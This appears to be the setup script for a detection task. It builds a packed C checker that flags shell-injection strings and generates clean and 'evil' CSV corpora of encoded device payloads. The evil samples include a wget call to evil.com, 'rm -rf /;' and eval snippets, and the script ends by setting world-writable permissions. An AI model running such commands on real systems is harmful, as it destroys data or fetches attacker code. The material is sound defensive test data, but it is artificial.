#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip gcc upx-ucl coreutils gawk grep bash libc-bin
pip3 install pytest

mkdir -p /app/corpora/clean /app/corpora/evil

cat << 'EOF' > /tmp/checker.c
#include <stdio.h>
#include <string.h>

int main() {
    char buffer[4096];
    size_t len = fread(buffer, 1, sizeof(buffer)-1, stdin);
    buffer[len] = '\0';
    if (strstr(buffer, "$()") || strstr(buffer, ";") || strstr(buffer, "eval(") || strstr(buffer, "wget")) {
        return 1;
    }
    return 0;
}
EOF

gcc -O2 /tmp/checker.c -o /app/config_checker
strip --strip-all /app/config_checker
upx -9 /app/config_checker || true

cat << 'EOF' > /tmp/generate.py
import os
import random
import base64
from datetime import datetime, timedelta

def encode_payload(text, encoding):
    if encoding == 'plain_utf8':
        return text
    elif encoding == 'base64_utf8':
        return base64.b64encode(text.encode('utf-8')).decode('ascii')
    elif encoding == 'base64_utf16le':
        return base64.b64encode(text.encode('utf-16le')).decode('ascii')

encodings = ['plain_utf8', 'base64_utf8', 'base64_utf16le']
good_texts = ['config_update_1', 'status_ok', 'reboot_scheduled', 'param=value']
bad_texts = ['wget http://evil.com', 'rm -rf /;', 'eval(something)', 'echo $()']

def generate_file(path, is_evil):
    lines = []
    base_time = datetime(2023, 10, 14, 15, 0, 0)

    if is_evil and random.choice([True, False]):
        device = "EDGE-FLOOD"
        for i in range(55):
            t = base_time + timedelta(seconds=i*10)
            ts = t.strftime('%Y-%m-%dT%H:%M:%SZ')
            enc = random.choice(encodings)
            payload = encode_payload(random.choice(good_texts), enc)
            lines.append(f"{ts},{device},{enc},{payload}")
    else:
        for i in range(20):
            t = base_time + timedelta(minutes=i*2)
            ts = t.strftime('%Y-%m-%dT%H:%M:%SZ')
            device = f"EDGE-{random.randint(1,5)}"
            enc = random.choice(encodings)

            if is_evil and i == 5:
                text = random.choice(bad_texts)
            else:
                text = random.choice(good_texts)

            payload = encode_payload(text, enc)
            lines.append(f"{ts},{device},{enc},{payload}")

    with open(path, 'w') as f:
        f.write('\n'.join(lines) + '\n')

for i in range(50):
    generate_file(f'/app/corpora/clean/file_{i}.csv', False)
    generate_file(f'/app/corpora/evil/file_{i}.csv', True)
EOF

python3 /tmp/generate.py

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user /app
